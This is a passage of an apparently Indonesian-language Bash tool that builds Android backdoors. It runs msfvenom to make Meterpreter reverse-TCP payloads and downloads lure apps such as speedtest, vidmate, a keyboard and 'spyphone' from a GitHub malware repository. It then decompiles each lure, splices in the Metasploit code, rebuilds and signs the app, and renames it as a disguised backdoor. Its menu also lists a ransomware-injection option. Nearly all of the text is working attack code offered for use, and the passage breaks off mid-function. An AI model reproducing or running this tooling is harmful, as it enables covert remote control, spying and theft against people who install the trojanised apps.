        printf '\033[31;1m'
        spiner
        echo
        sleep 0.025
        service apache2 start > /dev/null
        printf "\033[37;1m[\033[32;1m*\033[37;1m] apache server\033[31;1m [\033[32;1mOK\033[31;1m]\n"
        spiner
        echo
        sleep 0.025
        service postgresql start > /dev/null
        printf "\033[37;1m[\033[32;1m*\033[37;1m] postgresql\033[31;1m   [\033[32;1mOK\033[31;1m]\n"
        spiner
        echo
        sleep 0.025
        printf "\033[37;1m[\033[32;1m*\033[37;1m] starting metasploit listener . . .\033[31;1m\n"
        spiner
        echo
        sleep 2
        clear
}

# sign backdoor file manual inject
#
function sign_orig(){
        printf "\033[37;1m[\033[32;1m*\033[37;1m] memeriksa .android/key.keystore untuk penandatanganan\033[31;1m\n"
        spiner
        echo
if [ ! -f .android/key.keystore ]; then
        printf "\033[37;1m[\033[31;1mx\033[37;1m] Kunci debug tidak ditemukan. membuatnya sekarang\033[31;1m\n"
        spiner
        echo
        if [ ! -d ".android"  ]; then
        mkdir .android > /dev/null
        fi
        keytool -genkey -v -keystore .android/key.keystore -storepass android -alias key -keypass android -keyalg RSA -keysize 2048 -validity 10000
fi
        printf "\033[37;1m[\033[32;1m*\033[37;1m] mencoba menandatangani paket dengan kunci android anda\033[31;1m\n"
        spiner
        echo
        jarsigner -keystore .android/key.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA ori.apk key > /dev/null 2>&1
        printf "\033[37;1m[\033[32;1m*\033[37;1m] menandatangani aplikasi backdoor anda,\033[32;1m succesfully\033[31;1m\n"
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] mencoba memverifikasi aplikasi backdoor anda, please wait\033[31;1m\n"
        spiner
        echo
        jarsigner -verify -verbose -certs ori.apk.apk > /dev/null 2>&1
        printf "\033[37;1m[\033[32;1m*\033[37;1m] menyelaraskan aplikasi kom pilasi ulang\033[31;1m\n"
        spiner
        echo
        zipalign 4 ori.apk $nama.apk > /dev/null 2>&1
        printf "\033[37;1m[\033[32;1m*\033[37;1m] verifikasi aplikasi backdoor anda,\033[32;1m succesfully\033[31;1m\n"
        spiner

}

# sign backdoor
#
function sign(){
	echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] memeriksa .android/key.keystore untuk penandatanganan\033[31;1m\n"
        spiner
        echo
if [ ! -f .android/key.keystore ]; then
        printf "\033[37;1m[\033[31;1mx\033[37;1m] Kunci debug tidak ditemukan. membuatnya sekarang\033[31;1m\n"
        spiner
        echo
        if [ ! -d ".android"  ]; then
        mkdir .android > /dev/null 2>&1
        fi
        keytool -genkey -v -keystore .android/key.keystore -storepass android -alias key -keypass android -keyalg RSA -keysize 2048 -validity 10000
fi
        printf "\033[37;1m[\033[32;1m*\033[37;1m] mencoba menandatangani paket dengan kunci android anda\033[31;1m\n"
        spiner
        echo
        jarsigner -keystore .android/key.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA malware.apk key > /dev/null 2>&1
        printf "\033[37;1m[\033[32;1m*\033[37;1m] menandatangani aplikasi backdoor anda,\033[32;1m succesfully\033[31;1m\n"
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] mencoba memverifikasi aplikasi backdoor anda, please wait\033[31;1m\n"
        spiner
        echo
        jarsigner -verify -verbose -certs malware.apk > /dev/null 2>&1
        printf "\033[37;1m[\033[32;1m*\033[37;1m] verifikasi aplikasi backdoor anda,\033[32;1m succesfully\033[31;1m\n"
        spiner
        echo

}

rename(){
read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] masukan nama backdoor : "'\033[34;1m')" new
printf '\033[31;1m'
spiner
echo
cd $path/Malware && mv malware.apk $new.apk
printf "\033[31;1m[\033[32;1m✔\033[31;1m]\033[37;1m nama backdoor berhasil dibuat menjadi ~>\033[31;1m $new\n"
spiner
}

function android(){
	clear
	baner
	echo
        printf "\033[31;1m[\033[32;1m1\033[31;1m]\033[37;1m Backdoor Android\n"
        sleep 0.025
        printf "\033[31;1m[\033[32;1m2\033[31;1m]\033[37;1m Bind Backdoor original from template\033[31;1m\n"
        sleep 0.025
        printf "\033[31;1m[\033[32;1m3\033[31;1m]\033[37;1m Bind Backdoor original from file\033[31;1m [\033[32;1mBETA\033[31;1m]\n"
        sleep 0.025
				printf "\033[31;1m[\033[32;1m4\033[31;1m]\033[37;1m Bind Backdoor + inject ransomware\033[31;1m [\033[32;1mBETA\033[31;1m]\n"
        sleep 0.025
        printf "\033[31;1m[\033[32;1m0\033[31;1m]\033[37;1m kembali\n\n"
        read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
        sleep 0.025
        echo
        	if [ $xyz = "1"  ];
        	then
        	backdoor

        	elif [ $xyz = "2"  ];
        	then
        	backdoor_template

        	elif [ $xyz = "3"  ];
        	then
        	backdoor_file

					elif [ $xyz = "4"  ];
					then
					backdoor_ransomware

		elif [ $xyz = "0"  ];
		then
		run_metasploit

		else
		printf "\033[31;1m[\033[37;1m!\033[31;1m]\033[37;1m masukan input dengan benar . .\n"
	        sleep 2
		android

		fi
}

# fungsi android user input backdoor android
#
function backdoor(){
# fungsi user xyz 1
                sets
                sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/malware.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
                printf '\033[31;1m'
                spiner
                echo
                printf "\033[37;1m[\033[32;1m*\033[37;1m] generate backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
                printf '\033[31;1m'
                spiner
                echo
                sleep 2
                rename
                sign
}

#fungsi android user input backdoor template
#
function backdoor_template(){
printf '\033[31;1m'
printf "\033[31;1m[\033[32;1m01\033[31;1m]\033[37;1m spyphone\033[31;1m\n"
sleep 0.025
printf "\033[31;1m[\033[32;1m02\033[31;1m]\033[37;1m speedtest\033[31;1m\n"
sleep 0.025
printf "\033[31;1m[\033[32;1m03\033[31;1m]\033[37;1m vidmate\033[31;1m\n"
sleep 0.025
printf "\033[31;1m[\033[32;1m04\033[31;1m]\033[37;1m wifi wps\033[31;1m\n"
sleep 0.025
printf "\033[31;1m[\033[32;1m05\033[31;1m]\033[37;1m uc mini\033[31;1m\n"
sleep 0.025
printf "\033[31;1m[\033[32;1m06\033[31;1m]\033[37;1m keyboard\033[31;1m\n"
sleep 0.025
printf "\033[31;1m[\033[32;1m07\033[31;1m]\033[37;1m g45\033[31;1m\n"
sleep 0.025
printf "\033[31;1m[\033[32;1m08\033[31;1m]\033[37;1m Design\033[31;1m\n"
sleep 0.025
printf "\033[31;1m[\033[32;1m09\033[31;1m]\033[37;1m Droidsql\033[31;1m\n"
sleep 0.025
printf "\033[31;1m[\033[32;1m10\033[31;1m]\033[37;1m ave play\033[31;1m\n"
sleep 0.025
printf "\033[31;1m[\033[32;1m11\033[31;1m]\033[37;1m indoxxi\033[31;1m\n"
sleep 0.025
printf "\033[31;1m[\033[32;1m12\033[31;1m]\033[37;1m picsart pro\033[31;1m\n"
sleep 0.025
printf "\033[31;1m[\033[32;1m00\033[31;1m]\033[37;1m kembali\033[31;1m\n"
sleep 0.025
printf "\033[31;1m[\033[32;1m**\033[31;1m]\n"
sleep 0.025
read -p "$(printf "\033[31;1m[\033[32;1m**\033[31;1m] choice : "'\033[34;1m')" xyz
sleep 0.025
echo
clear
	if [ $xyz = "1" ] || [ $xyz = "01"  ];
	then
	spyphone
	sign
	rename_backdoor

	elif [ $xyz = "2" ] || [ $xyz = "02"  ];
	then
	speedtest
	sign
	rename_backdoor

	elif [ $xyz = "3" ] || [ $xyz = "03"  ];
	then
	vidmate
	sign
	rename_backdoor

	elif [ $xyz = "4" ] || [ $xyz = "04"  ];
	then
	wifiwps
	sign
	rename_backdoor

	elif [ $xyz = "5" ] || [ $xyz = "05"  ];
	then
	uc
	sign
	rename_backdoor

	elif [ $xyz = "6" ] || [ $xyz = "06"  ];
	then
	keyboard
	sign
	rename_backdoor

	elif [ $xyz = "7" ] || [ $xyz = "07"  ];
	then
	g45
	sign
	rename_backdoor

	elif [ $xyz = "8" ] || [ $xyz = "08"  ];
	then
	design
	sign
	rename_backdoor

	elif [ $xyz = "9" ] || [ $xyz = "09"  ];
	then
	droidsql
	sign
	rename_backdoor

	elif [ $xyz = "10" ] || [ $xyz = "10"  ];
	then
	ave
	sign
	rename_backdoor

	elif [ $xyz = "11" ] || [ $xyz = "11"  ];
	then
	indoxxi
	sign
	rename_backdoor

	elif [ $xyz = "12" ] || [ $xyz = "12"  ];
	then
	picsart
	sign
	rename_backdoor

	elif [ $xyz = "0" ] || [ $xyz = "00"  ];
	then
	android

	else
	printf "\033[31;1m[\033[37;1m!\033[31;1m]\033[37;1m masukan input dengan benar . .\n"
	sleep 2
	printf '\033[31;1m'
	backdoor_template

	fi

}

# backdoor spyphone
#
function spyphone(){
        $fixjava
        sets
        sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
        printf '\033[31;1m'
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] generate backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
        printf '\033[31;1m'
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] download spyphone from template\033[31;1m\n"
        printf '\033[31;1m'
        spiner
        echo
        cd $path/Malware
        wget https://github.com/K1M4K-ID/malware/blob/main/spyphone.apk?raw=true > /dev/null 2>&1
        mv spyphone.apk?raw=true spyphone.apk > /dev/null
        printf "\033[37;1m[\033[32;1m*\033[37;1m] download\033[32;1m succesfully\033[31;1m\n"
        printf '\033[31;1m'
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle payload please wait\033[31;1m\n"
        printf '\033[31;1m'
        spiner
        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d payload.apk
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle spyphone please wait\033[31;1m\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d spyphone.apk
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] recompyle spyphone please wait\033[31;1m\033[31;1m\n"
        cd $path/Malware
        rm -fr spyphone/smali/com/metasploit/stage && cp -r payload/smali/com/metasploit spyphone/smali/com/metasploit
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] rebuild spyphone please wait\033[31;1m\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool b spyphone -o malware.apk
        rm -fr spyphone.apk spyphone payload payload.apk
        spiner
}

# fungsi backdoor speedtest
#
function speedtest(){
        $fixjava
        sets
        sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] generate backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] download speedtest from template\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        wget https://github.com/K1M4K-ID/malware/blob/main/speedtest.apk?raw=true > /dev/null 2>&1
        mv speedtest.apk?raw=true speedtest.apk > /dev/null
        printf "\033[37;1m[\033[32;1m*\033[37;1m] download\033[32;1m succesfully\033[31;1m\033[31;1m\n"
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle payload please wait\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d payload.apk
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle speedtest please wait\033[31;1m\n"
        cd $path/Malware
        spiner
        echo
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d speedtest.apk
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] recompyle speedtest please wait\033[31;1m\n"
        cd $path/Malware
        rm -fr speedtest/smali/com/metasploit/stage && cp -r payload/smali/com/metasploit speedtest/smali/com/metasploit
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] rebuild speedtest please wait\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool b speedtest -o malware.apk
        rm -fr speedtest.apk speedtest payload payload.apk
        spiner
}

# fungsi backdoor vidmate
#
function vidmate(){
        $fixjava
        sets
        sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] generate backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] download vidmate from template\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        wget https://github.com/K1M4K-ID/malware/blob/main/vidmate.apk?raw=true > /dev/null 2>&1
        mv vidmate.apk?raw=true vidmate.apk > /dev/null
        printf "\033[37;1m[\033[32;1m*\033[37;1m] download\033[32;1m succesfully\033[31;1m\n"
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle payload please wait\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d payload.apk
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle vidmate please wait\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d vidmate.apk
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] recompyle vidmate please wait\033[31;1m\n"
        cd $path/Malware
        rm -fr vidmate/smali/com/metasploit/stage && cp -r payload/smali/com/metasploit vidmate/smali/com/metasploit
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] rebuild vidmate please wait\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool b vidmate -o malware.apk
        rm -fr vidmate.apk vidmate payload payload.apk
        spiner
}

# fungsi backdoor wifi wps
#
function wifiwps(){
        $fixjava
        sets
        sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] generate backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] download wifi wps from template\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        wget https://github.com/K1M4K-ID/malware/blob/main/wps.apk?raw=true > /dev/null 2>&1
        mv wps.apk?raw=true wps.apk > /dev/null
        printf "\033[37;1m[\033[32;1m*\033[37;1m] download\033[32;1m succesfully\033[31;1m\n"
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle payload please wait\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d payload.apk
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle wifi wps please wait\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d wps.apk
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] recompyle wifi wps please wait\033[31;1m\n"
        cd $path/Malware
        rm -fr wps/smali/com/metasploit/stage && cp -r payload/smali/com/metasploit wps/smali/com/metasploit
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] rebuild wifi wps please wait\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool b wps -o malware.apk
        rm -fr wps.apk wps payload payload.apk
        spiner
}

# fungsi backdoor uc mini
#
function uc(){
        $fixjava
        sets
        sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] generate backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] download uc mini from template\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        wget https://github.com/K1M4K-ID/malware/blob/main/uc.apk?raw=true > /dev/null 2>&1
        mv uc.apk?raw=true uc.apk > /dev/null
        printf "\033[37;1m[\033[32;1m*\033[37;1m] download\033[32;1m succesfully\033[31;1m\n"
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle payload please wait\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d payload.apk
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle uc mini please wait\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d uc.apk
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] recompyle uc mini please wait\033[31;1m\n"
        cd $path/Malware
        rm -fr uc/smali/com/metasploit/stage && cp -r payload/smali/com/metasploit uc/smali/com/metasploit
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] rebuild uc mini please wait\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool b uc -o malware.apk
        rm -fr uc.apk uc payload payload.apk
        spiner
}

# fungsi backdoor keyboard hacker
#
function keyboard(){
        $fixjava
        sets
        sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] generate backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] download keyboard hacker from template\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        wget https://github.com/K1M4K-ID/malware/blob/main/keyboard.apk?raw=true > /dev/null 2>&1
        mv keyboard.apk?raw=true keyboard.apk > /dev/null
        printf "\033[37;1m[\033[32;1m*\033[37;1m] download\033[32;1m succesfully\033[31;1m\n"
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle payload please wait\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d payload.apk
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle keyboard hacker please wait\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d keyboard.apk
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] recompyle keyboard hacker please wait\033[31;1m\n"
        cd $path/Malware
        rm -fr keyboard/smali/com/metasploit/stage && cp -r payload/smali/com/metasploit keyboard/smali/com/metasploit
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] rebuild keyboard hacker please wait\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool b keyboard -o malware.apk
        rm -fr keyboard.apk keyboard payload payload.apk
        spiner
}

# fungsi backdoor g45
#
function g45(){
        $fixjava
        sets
        sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] generate backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] download g45 from template\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        wget https://github.com/K1M4K-ID/malware/blob/main/g45.apk?raw=true > /dev/null 2>&1
        mv g45.apk?raw=true g45.apk > /dev/null
        printf "\033[37;1m[\033[32;1m*\033[37;1m] download\033[32;1m succesfully\033[31;1m\n"
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle payload please wait\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d payload.apk
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle g45 please wait\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d g45.apk
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] recompyle g45 please wait\033[31;1m\n"
        cd $path/Malware
        rm -fr g45/smali/com/metasploit/stage && cp -r payload/smali/com/metasploit g45/smali/com/metasploit
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] rebuild g45 please wait\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool b g45 -o malware.apk
        rm -fr g45.apk g45 payload payload.apk
        spiner
}

# fungsi backdoor design
#
function design(){
        $fixjava
        sets
        sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] generate backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] download design from template\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        wget https://github.com/K1M4K-ID/malware/blob/main/design.apk?raw=true > /dev/null 2>&1
        mv design.apk?raw=true design.apk > /dev/null
        printf "\033[37;1m[\033[32;1m*\033[37;1m] download\033[32;1m succesfully\033[31;1m\n"
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle payload please wait\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d payload.apk
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle design please wait\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d design.apk
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] recompyle design please wait\033[31;1m\n"
        cd $path/Malware
        rm -fr design/smali/com/metasploit/stage && cp -r payload/smali/com/metasploit design/smali/com/metasploit
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] rebuild design please wait\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool b design -o malware.apk
        rm -fr design.apk design payload payload.apk
        spiner
}

# fungsi backdoor droidsqli
#
function droidsql(){
        $fixjava
        sets
        sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] generate backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] download droidsql from template\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        wget https://github.com/K1M4K-ID/malware/blob/main/droidsqli.apk?raw=true > /dev/null 2>&1
        mv droidsqli.apk?raw=true droidsqli.apk > /dev/null
        printf "\033[37;1m[\033[32;1m*\033[37;1m] download\033[32;1m succesfully\033[31;1m\n"
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle payload please wait\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d payload.apk
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle droidsql please wait\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d droidsqli.apk
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] recompyle droidsql please wait\033[31;1m\n"
        cd $path/Malware
        rm -fr droidsqli/smali/com/metasploit/stage && cp -r payload/smali/com/metasploit droidsqli/smali/com/metasploit
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] rebuild droidsql please wait\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool b droidsqli -o malware.apk
        rm -fr droidsqli.apk droidsqli payload payload.apk
        spiner
}

# fungsi backdoor ave player
#
function ave(){
        $fixjava
        sets
        sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] generate backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] download ave player from template\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        wget https://github.com/K1M4K-ID/malware/blob/main/ave.apk?raw=true > /dev/null 2>&1
        mv ave.apk?raw=true ave.apk > /dev/null
        printf "\033[37;1m[\033[32;1m*\033[37;1m] download\033[32;1m succesfully\033[31;1m\n"
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle payload please wait\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d payload.apk
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle ave player please wait\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d ave.apk
        spiner
        echo
